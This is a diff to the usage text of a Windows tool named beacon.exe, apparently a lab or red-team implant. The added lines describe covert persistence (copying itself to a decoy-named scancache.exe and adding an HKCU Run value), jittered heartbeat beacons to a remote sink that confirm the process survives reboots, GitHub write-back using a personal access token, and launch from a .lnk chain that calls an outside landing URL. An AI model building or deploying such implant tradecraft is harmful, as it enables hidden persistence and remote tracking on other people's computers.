@@ -11,7 +11,16 @@ Lanes (all outcomes written to local receipts FIRST, exit code always 0):
     (no-ADS = landed via un-zoned fetch; ADS-present:3 = zone-marked landing)
     NOTE: .NET File.OpenRead cannot open ADS paths - sensor uses kernel32
     CreateFileW (measured 2026-10-27, both controls pass).
- 4. github contents write-back (needs --token/--gh; lab use only, see note)
+ 4. github contents write-back (needs --token/--gh + a REAL PAT: the gho_
+    OAuth token from Git Credential Manager authenticates /user and git-push
+    but REST contents writes 404 behind the app layer; and POST-contents
+    fails 404 until the repo has a seed commit. reads 200/404 gotchas banked)
+ 5. PERSIST --persist: self-copy to SyncCache\scancache.exe + HKCU Run value
+    (quoted args survive reboot); --uninstall removes both (delayed delete
+    when running from the copy itself).
+ 6. ALIVE --alive <s> --hb <s>: heartbeat beats (±15% jitter) to sink +
+    beats.log; a gap in beats at the webhook = process death; new birth hit
+    after reboot = survival. Measured: beats at +2/4/5s of a 5s window.
 
 Usage from a .lnk chain:
   beacon.exe --tag V042 --get "http://YOUR-LANDING/beat?t={tag}&h={h}"
